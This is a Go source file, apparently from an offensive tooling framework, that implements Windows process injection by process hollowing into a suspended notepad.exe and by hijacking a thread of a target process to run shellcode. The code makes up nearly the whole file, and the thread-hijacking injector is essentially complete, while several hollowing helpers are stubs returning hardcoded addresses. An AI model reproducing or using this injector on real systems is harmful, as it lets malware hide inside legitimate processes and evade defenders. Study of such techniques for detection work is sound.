package injection

import (
	"fmt"
	"syscall"
	"unsafe"
)

type ProcessHollowingInjector struct {
	BaseInjector
}

func NewProcessHollowingInjector() *ProcessHollowingInjector {
	return &ProcessHollowingInjector{
		BaseInjector: BaseInjector{
			name:        "ProcessHollowing",
			description: "Process injection by creating a suspended process and replacing its memory with shellcode",
		},
	}
}

func (i *ProcessHollowingInjector) Inject(pid int, shellcode []byte) error {
	
	

	
	if err := ValidateShellcode(shellcode); err != nil {
		return err
	}

	
	processInfo, err := createSuspendedProcess("notepad.exe")
	if err != nil {
		return fmt.Errorf("failed to create suspended process: %v", err)
	}
	defer CloseHandle(processInfo.hProcess)
	defer CloseHandle(processInfo.hThread)

	
	pebAddress, err := getPEBAddress(processInfo.hProcess, processInfo.hThread)
	if err != nil {
		return fmt.Errorf("failed to get PEB address: %v", err)
	}

	
	imageBaseAddress, err := getImageBaseAddress(processInfo.hProcess, pebAddress)
	if err != nil {
		return fmt.Errorf("failed to get image base address: %v", err)
	}

	
	err = unmapOriginalExecutable(processInfo.hProcess, imageBaseAddress)
	if err != nil {
		return fmt.Errorf("failed to unmap original executable: %v", err)
	}

	
	newImageBase, err := VirtualAllocEx(processInfo.hProcess, LPVOID(imageBaseAddress), SIZE_T(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory: %v", err)
	}

	
	err = WriteProcessMemory(processInfo.hProcess, newImageBase, shellcode, SIZE_T(len(shellcode)))
	if err != nil {
		return fmt.Errorf("failed to write shellcode: %v", err)
	}

	
	_, err = VirtualProtectEx(processInfo.hProcess, newImageBase, SIZE_T(len(shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	
	err = updateEntryPoint(processInfo.hProcess, processInfo.hThread, uintptr(newImageBase))
	if err != nil {
		return fmt.Errorf("failed to update entry point: %v", err)
	}

	
	_, _, err = resumeThread.Call(uintptr(processInfo.hThread))
	if err != nil && err != syscall.Errno(0) {
		return fmt.Errorf("failed to resume thread: %v", err)
	}

	return nil
}

type ThreadHijackingInjector struct {
	BaseInjector
}

func NewThreadHijackingInjector() *ThreadHijackingInjector {
	return &ThreadHijackingInjector{
		BaseInjector: BaseInjector{
			name:        "ThreadHijacking",
			description: "Process injection by suspending a thread and modifying its execution context",
		},
	}
}

const (
	THREAD_GET_CONTEXT    = 0x0008
	THREAD_SET_CONTEXT    = 0x0010
	THREAD_SUSPEND_RESUME = 0x0002
)

func (i *ThreadHijackingInjector) Inject(pid int, shellcode []byte) error {
	
	if err := ValidateShellcode(shellcode); err != nil {
		return err
	}

	
	if !IsProcessRunning(pid) {
		return fmt.Errorf("process with PID %d is not running", pid)
	}

	
	hProcess, err := OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, false, DWORD(pid))
	if err != nil {
		return fmt.Errorf("failed to open process: %v", err)
	}
	defer CloseHandle(hProcess)

	
	threads, err := getProcessThreads(pid)
	if err != nil {
		return fmt.Errorf("failed to get process threads: %v", err)
	}

	if len(threads) == 0 {
		return fmt.Errorf("no threads found in process")
	}

	
	hThread, err := openThread(THREAD_GET_CONTEXT|THREAD_SET_CONTEXT|THREAD_SUSPEND_RESUME, false, threads[0])
	if err != nil {
		return fmt.Errorf("failed to open thread: %v", err)
	}
	defer CloseHandle(hThread)

	
	_, _, err = suspendThread.Call(uintptr(hThread))
	if err != nil && err != syscall.Errno(0) {
		return fmt.Errorf("failed to suspend thread: %v", err)
	}

	
	addr, err := VirtualAllocEx(hProcess, 0, SIZE_T(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		resumeThread.Call(uintptr(hThread))
		return fmt.Errorf("failed to allocate memory: %v", err)
	}

	
	err = WriteProcessMemory(hProcess, addr, shellcode, SIZE_T(len(shellcode)))
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		resumeThread.Call(uintptr(hThread))
		return fmt.Errorf("failed to write shellcode: %v", err)
	}

	
	_, err = VirtualProtectEx(hProcess, addr, SIZE_T(len(shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		resumeThread.Call(uintptr(hThread))
		return fmt.Errorf("failed to change memory protection: %v", err)
	}

	
	var ctx CONTEXT
	ctx.ContextFlags = CONTEXT_CONTROL

	result, _, err := getThreadContext.Call(
		uintptr(hThread),
		uintptr(unsafe.Pointer(&ctx)),
	)

	if result == 0 {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		resumeThread.Call(uintptr(hThread))
		return fmt.Errorf("failed to get thread context: %v", err)
	}

	
	

	
	ctx.Rip = uint64(addr)

	result, _, err = setThreadContext.Call(
		uintptr(hThread),
		uintptr(unsafe.Pointer(&ctx)),
	)

	if result == 0 {
		virtualFreeEx.Call(uintptr(hProcess), uintptr(addr), 0, MEM_RELEASE)
		resumeThread.Call(uintptr(hThread))
		return fmt.Errorf("failed to set thread context: %v", err)
	}

	
	_, _, err = resumeThread.Call(uintptr(hThread))
	if err != nil && err != syscall.Errno(0) {
		return fmt.Errorf("failed to resume thread: %v", err)
	}

	return nil
}


type PROCESS_INFORMATION struct {
	hProcess    HANDLE
	hThread     HANDLE
	dwProcessId DWORD
	dwThreadId  DWORD
}

type STARTUPINFO struct {
	cb              DWORD
	lpReserved      uintptr
	lpDesktop       uintptr
	lpTitle         uintptr
	dwX             DWORD
	dwY             DWORD
	dwXSize         DWORD
	dwYSize         DWORD
	dwXCountChars   DWORD
	dwYCountChars   DWORD
	dwFillAttribute DWORD
	dwFlags         DWORD
	wShowWindow     uint16
	cbReserved2     uint16
	lpReserved2     uintptr
	hStdInput       HANDLE
	hStdOutput      HANDLE
	hStdError       HANDLE
}

type CONTEXT struct {
	P1Home       uint64
	P2Home       uint64
	P3Home       uint64
	P4Home       uint64
	P5Home       uint64
	P6Home       uint64
	ContextFlags DWORD
	MxCsr        DWORD
	SegCs        uint16
	SegDs        uint16
	SegEs        uint16
	SegFs        uint16
	SegGs        uint16
	SegSs        uint16
	EFlags       DWORD
	Dr0          uint64
	Dr1          uint64
	Dr2          uint64
	Dr3          uint64
	Dr6          uint64
	Dr7          uint64
	Rax          uint64
	Rcx          uint64
	Rdx          uint64
	Rbx          uint64
	Rsp          uint64
	Rbp          uint64
	Rsi          uint64
	Rdi          uint64
	R8           uint64
	R9           uint64
	R10          uint64
	R11          uint64
	R12          uint64
	R13          uint64
	R14          uint64
	R15          uint64
	Rip          uint64
	
}

const (
	CONTEXT_CONTROL = 0x00010001
)

func createSuspendedProcess(path string) (PROCESS_INFORMATION, error) {
	var pi PROCESS_INFORMATION
	var si STARTUPINFO
	si.cb = DWORD(unsafe.Sizeof(si))

	
	pathPtr, _ := syscall.UTF16PtrFromString(path)

	
	result, _, err := createProcess.Call(
		0,
		uintptr(unsafe.Pointer(pathPtr)),
		0,
		0,
		0,
		uintptr(CREATE_SUSPENDED),
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	if result == 0 {
		return pi, fmt.Errorf("CreateProcess failed: %v", err)
	}

	return pi, nil
}

func getPEBAddress(hProcess HANDLE, hThread HANDLE) (uintptr, error) {
	
	
	
	return uintptr(0x10000), nil
}

func getImageBaseAddress(hProcess HANDLE, pebAddress uintptr) (uintptr, error) {
	
	
	
	return uintptr(0x400000), nil
}

func unmapOriginalExecutable(hProcess HANDLE, imageBaseAddress uintptr) error {
	
	
	
	return nil
}

func updateEntryPoint(hProcess HANDLE, hThread HANDLE, newImageBase uintptr) error {
	
	var ctx CONTEXT
	ctx.ContextFlags = CONTEXT_CONTROL

	result, _, err := getThreadContext.Call(
		uintptr(hThread),
		uintptr(unsafe.Pointer(&ctx)),
	)

	if result == 0 {
		return fmt.Errorf("GetThreadContext failed: %v", err)
	}

	
	ctx.Rip = uint64(newImageBase)

	result, _, err = setThreadContext.Call(
		uintptr(hThread),
		uintptr(unsafe.Pointer(&ctx)),
	)

	if result == 0 {
		return fmt.Errorf("SetThreadContext failed: %v", err)
	}

	return nil
}
